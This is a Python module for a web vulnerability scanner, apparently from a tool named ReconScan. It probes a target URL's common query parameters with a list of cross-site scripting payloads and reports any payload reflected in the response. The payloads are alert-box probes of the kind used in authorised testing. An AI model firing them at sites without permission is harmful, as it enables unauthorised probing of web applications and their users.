"""
ReconScan XSS Scanner

Dedicated module for Cross-Site Scripting vulnerability detection.
Supports reflected, stored, and DOM-based XSS detection.
"""

import urllib.parse

class XSSScanner:
    """Cross-Site Scripting vulnerability scanner with advanced payload testing."""
    
    def __init__(self, false_positive_filters=None, system_config=None):
        """Initialize XSS scanner."""
        self.false_positive_filters = false_positive_filters
        self.system_config = system_config
        
        # Enhanced XSS payloads
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "'-alert('XSS')-'",
            "\";alert('XSS');//",
            "</script><script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>"
        ]
        
        # Common parameter names for XSS testing
        self.parameters = ['q', 'search', 'query', 'name', 'comment', 'message', 'text', 'input', 'data', 'value', 'content', 'title']
    
    async def scan(self, session, target, verbose=True):
        """Perform XSS vulnerability scan."""
        if verbose:
            print("  â†’ Testing XSS payloads...")
        
        vulnerabilities = []
        vulnerabilities_found = 0
        
        for param in self.parameters:
            for payload in self.payloads:
                try:
                    # Test with different parameters
                    test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
                    
                    async with session.get(test_url) as response:
                        content = await response.text()
                        
                        # Check if payload is reflected in response (various encodings)
                        payload_variations = [
                            payload,
                            payload.replace("'", "&#x27;"),
                            payload.replace("'", "&#39;"),
                            payload.replace("\"", "&quot;"),
                            payload.replace("<", "&lt;"),
                            payload.replace(">", "&gt;"),
                            payload.replace("&", "&amp;"),
                            payload.lower(),
                            payload.upper()
                        ]
                        
                        if any(var in content for var in payload_variations):
                            # Check if this is a known false positive (if filtering is enabled)
                            if self._is_false_positive_filtering_enabled() and self.false_positive_filters:
                                fp_result = self.false_positive_filters.is_xss_false_positive(test_url, param, payload)
                                if fp_result:
                                    if verbose:
                                        print(f"     XSS pattern filtered ({fp_result['ai_label']}): {param}={payload}")
                                        print(f"       Reason: {fp_result['reason']}")
                                    break
                            
                            vulnerability = {
                                'type': 'Cross-Site Scripting (XSS)',
                                'severity': 'Medium',
                                'url': test_url,
                                'payload': payload,
                                'description': f'XSS vulnerability detected in parameter "{param}" through payload reflection'
                            }
                            vulnerabilities.append(vulnerability)
                            vulnerabilities_found += 1
                            if verbose:
                                print(f"     XSS vulnerability found: {param}={payload}")
                            break
                            
                except Exception as e:
                    if verbose:
                        print(f"    ! Error testing {param} with '{payload}': {str(e)}")
                    continue
        
        if verbose and vulnerabilities_found == 0:
            print("     No XSS vulnerabilities detected")
        
        return vulnerabilities
    
    def _is_false_positive_filtering_enabled(self):
        """Check if false positive filtering is enabled in configuration."""
        if not self.system_config:
            return True
        
        xss_config = self.system_config.get_payload_defaults('xss')
        return xss_config.get('false_positive_filtering', True) 